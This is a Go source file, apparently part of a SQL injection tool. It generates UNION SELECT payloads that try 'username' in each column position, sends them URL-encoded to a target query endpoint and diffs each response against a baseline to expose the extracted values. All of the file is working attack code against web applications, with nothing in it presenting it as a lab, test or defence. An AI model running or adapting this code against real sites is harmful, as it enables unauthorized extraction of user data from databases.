package main

import (
	"strings"
	"fmt"
	//"strconv"
	"net/url"
)


func Generate_Column_Selection(colNum int) []string {
	var columns []string

	for i := 1; i <= colNum; i++ {
		col := "NULL"
		columns = append(columns, col)
	}
	return columns
}

func Generate_Username_Column_Selection(colNum int) [][]string {
	cols := Generate_Column_Selection(colNum)
	
	var options [][]string
	for i := 0; i < colNum; i++ {
		username_option := make([]string, colNum)
		copy(username_option, cols)
		username_option[i] = "username"
		options = append(options, username_option)
	}

	return options
}

func FindDifference(str1, str2 string) string {
    minLength := len(str1)
    if len(str2) < minLength {
        minLength = len(str2)
    }
    diffIndex := -1
    for i := 0; i < minLength; i++ {
        if str1[i] != str2[i] {
            diffIndex = i
            break
        }
    }

    if diffIndex == -1 && len(str1) != len(str2) {
        if len(str1) > len(str2) {
            return str1[minLength:]
        }
        return str2[minLength:]
    }
    return str1[diffIndex:]
}

func Union_Select(init_body string, colNum int) {
	username_options := Generate_Username_Column_Selection(colNum)

	var cmd string 
	var cmd_opt string 
	var endPoint string
	for _, opt := range username_options {
		cmd_opt = strings.Join(opt, ",")
		cmd = fmt.Sprintf("%s UNION SELECT %s FROM %s%s", escapeType, cmd_opt, tableName, commentType)
		fmt.Println(cmd)
		endPoint = queryURL + url.QueryEscape(cmd)
		resp := Send_Request("GET", endPoint)
		if (resp.StatusCode != 200) {
			continue
		}
		rbody := GetResponseBody(resp)
		diff := FindDifference(init_body, rbody)
		fmt.Println(diff)
	}
}
